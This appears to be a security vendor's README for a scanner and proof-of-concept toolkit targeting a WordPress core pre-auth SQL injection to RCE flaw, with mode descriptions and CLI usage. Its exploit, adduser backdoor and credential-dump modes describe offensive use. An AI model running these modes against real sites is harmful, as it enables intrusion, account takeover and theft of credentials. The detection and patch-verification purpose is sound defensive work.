<h1 align="center">wp2shell-scan</h1>
<h4 align="center">A scanner and proof-of-concept toolkit for CVE-2026-63030 (wp2shell), a pre-authenticated remote code execution vulnerability in WordPress core</h4>

![](https://dkh9ehwkisc4.cloudfront.net/static/files/62b9b146-d0c8-470b-ab54-94d0766afae6-wp2shell-banner.png)

# Features

- Two non-destructive detection methods: `--check-type time-based` (SLEEP timing) and `--check-type error-based` (TRUE/FALSE/broken differential). Both safe for broad estate scans.
- Support for lists of URLs and multiple targets in a single run.
- Content-based Boolean oracle extraction works without SLEEP, error output, or MySQL FILE privileges.
- Timing-based blind extraction fallback for unreliable Boolean oracles.
- REST endpoint probing to find which routes pass the injection through to WP_Query.
- Full exploit-chain validation (SQLi → INTO OUTFILE → PHP execution), gated behind an explicit `--i-have-authorization` flag.
- Local vulnerable testbed (Docker) for safe, offline reproduction.

---

# 🚨 Announcement (July 2026)

CVE-2026-63030 ("wp2shell") is a pre-authenticated remote code execution vulnerability in WordPress core. A route-confusion / index-desynchronisation bug in the REST API batch endpoint (`/batch/v1`) lets an unauthenticated attacker smuggle an unsanitised `author_exclude` value into `WP_Query`, resulting in SQL injection. Where the database user holds the FILE privilege, this leads to remote code execution via `SELECT ... INTO OUTFILE`. No plugins are required. A stock WordPress install is affected.

WordPress shipped fixes in **6.9.5, 7.0.2, and 7.1-beta2**. Patch immediately. If you need help scanning or discovering this vulnerability on your infrastructure, email team@fullhunt.io. Read more about it at [fullhunt.io/blog/2026/07/17/wp2shell-wordpress-core-pre-auth-rce-cve-2026-63030](https://fullhunt.io/blog/2026/07/17/wp2shell-wordpress-core-pre-auth-rce-cve-2026-63030).

| Branch | Vulnerable | Fixed |
|--------|------------|-------|
| 6.9    | 6.9.0–6.9.4 | 6.9.5 |
| 7.0    | 7.0.0–7.0.1 | 7.0.2 |
| 7.1    | 7.1-beta1  | 7.1-beta2 |
| < 6.9  | Not affected (batch endpoint not present) | — |

---

# Description

We have been researching wp2shell (CVE-2026-63030) since its public disclosure, and we worked in preventing this vulnerability with our customers. We are open-sourcing an open detection and scanning tool for discovering and validating CVE-2026-63030. This shall be used by security teams to scan their infrastructure for wp2shell, and to verify that WAF rules and patches actually block the attack chain in the organization's environment.

**wp2shell-scan.py** is a single, unified scanner supporting eight modes:

| Mode | Purpose | Authorisation |
|------|---------|---------------|
| `check` | Non-destructive detection. Two check types: `--check-type time-based` (SLEEP timing probe) or `--check-type error-based` (TRUE/FALSE/broken differential). | No |
| `probe-endpoints` | Discover which REST endpoints pass the injection through to WP_Query. | No |
| `probe` | Side-by-side diff of N SQL payload responses. | No |
| `extract` | Boolean oracle extraction of DB metadata and hashes. | Yes |
| `blind` | Timing-based blind extraction (fallback when the Boolean oracle is unreliable). | Yes |
| `exploit` | Validate the full SQLi → INTO OUTFILE → PHP execution chain. | Yes |
| `adduser` | Write a mu-plugin backdoor that creates an admin account; falls back to Boolean hash extraction. | Yes |
| `get-users` | Boolean oracle dump of all `wp_users` credentials. | Yes |

> **Note:** Modes marked "Yes" under Authorisation require the `--i-have-authorization` flag.

# Usage

```
$ python3 wp2shell-scan.py -h
usage: wp2shell-scan.py [-h] [-u URL] [-l USEDLIST] [-p PROXY]
                        [--check-type {time-based,error-based}] [-k]
                        [--timeout TIMEOUT] [--sleep SLEEP]
                        [--endpoint ENDPOINT] [--webroot PATH[,PATH...]]
                        [--out-name OUT_NAME] [--php-code PHP_CODE]
                        [--user-login USER_LOGIN] [--user-pass USER_PASS]
                        [--user-email USER_EMAIL] [--i-have-authorization]
                        [--sql LABEL:SQL] [--query QUERY] [--dump [KEY ...]]
                        [--all] [-v]
                        {check,probe-endpoints,probe,extract,blind,exploit,adduser,get-users}

CVE-2026-63030 (wp2shell) scanner: time-based / error-based checks, Boolean and blind extraction, authorized exploit validation.

positional arguments:
  {check,probe-endpoints,probe,extract,blind,exploit,adduser,get-users}
                        Scan mode.

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Check a single URL.
  -l USEDLIST, --list USEDLIST
                        Check a list of URLs.
  -p PROXY, --proxy PROXY
                        Send requests through proxy.
  --check-type {time-based,error-based}
                        Detection method for check mode - [Default: time-based].
  -k, --insecure        Disable TLS certificate verification.
  --timeout TIMEOUT     HTTP timeout (in seconds) - [Default: 15].
  --sleep SLEEP         SLEEP seconds for time-based checks and blind mode - [Default: 5].
  --endpoint ENDPOINT   REST endpoint used for the injection - [Default: /wp/v2/categories].
  --webroot PATH[,PATH...]
                        Server webroot for OUTFILE writes; repeatable - [Default: /var/www/html].
  --out-name OUT_NAME   Dropped filename - [Default: random].
  --php-code PHP_CODE   PHP written as the OUTFILE row terminator - [Default: '<?php phpinfo(); ?>'].
  --user-login USER_LOGIN
                        Backdoor username for adduser mode - [Default: wpadmin].
  --user-pass USER_PASS
                        Backdoor password for adduser mode.
  --user-email USER_EMAIL
                        Backdoor email for adduser mode.
  --i-have-authorization
                        Required for exploit, adduser, get-users, extract, and blind modes.
  --sql LABEL:SQL       probe mode: repeatable label:sql payload pair.
  --query QUERY         extract/blind mode: custom SQL scalar query to extract.
  --dump [KEY ...]      extract mode: prebuilt query keys (comma or space separated); empty=user+db+version.
  --all                 extract mode: dump all prebuilt queries.
  -v, --verbose
```

## Time-Based Check (non-destructive SLEEP timing probe)

```shell
$ python3 wp2shell-scan.py check -u https://wp.lab.local --check-type time-based
```

## Error-Based Check (non-destructive TRUE / FALSE / broken differential)

```shell
$ python3 wp2shell-scan.py check -u https://wp.lab.local --check-type error-based
```

## Scan a List of URLs

```shell
$ python3 wp2shell-scan.py check -l urls.txt
```

## Find Which REST Endpoints Are Injectable

```shell
$ python3 wp2shell-scan.py probe-endpoints -u https://wp.lab.local
```

## Extract Data via the Boolean Oracle (no FILE privilege needed)

```shell
$ python3 wp2shell-scan.py extract -u https://wp.lab.local --i-have-authorization --dump user,database,version
```

## Validate the Full RCE Chain (authorized targets only)

```shell
$ python3 wp2shell-scan.py exploit -u https://wp.lab.local --i-have-authorization
```

# Installation

```
$ pip3 install -r requirements.txt
```

# Docker Support

```shell
git clone https://github.com/fullhunt/wp2shell-scan.git
cd wp2shell-scan
sudo docker build -t wp2shell-scan .
sudo docker run -it --rm wp2shell-scan check -u https://wp.lab.local
```

# Local Testbed

A vulnerable-by-design WordPress 7.0.1 + MariaDB environment (with the FILE privilege granted) is included for safe, offline reproduction:

```shell
$ cd testbed
$ docker compose up -d
# Complete the WordPress setup wizard at http://localhost:8080, then:
$ python3 wp2shell-scan.py check -u http://localhost:8080
```

# About FullHunt

FullHunt is the next-generation attack surface management platform. FullHunt enables companies to discover all of their attack surfaces, monitor them for exposure, and continuously scan them for the latest security vulnerabilities. All, in a single platform, and more.

FullHunt provides an enterprise platform for organizations. The FullHunt Enterprise Platform provides extended scanning and capabilities for customers. FullHunt Enterprise platform allows organizations to closely monitor their external attack surface, and get detailed alerts about every single change that happens. Organizations around the world use the FullHunt Enterprise Platform to solve their continuous security and external attack surface security challenges.

# Legal Disclaimer

This project is made for educational and ethical testing purposes only. Usage of wp2shell-scan for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

# License

The project is licensed under MIT License.

# Author

_Mazin Ahmed_

- Email: _mazin at FullHunt.io_
- FullHunt: [https://fullhunt.io](https://fullhunt.io)
- Website: [https://mazinahmed.net](https://mazinahmed.net)
- Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
- Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
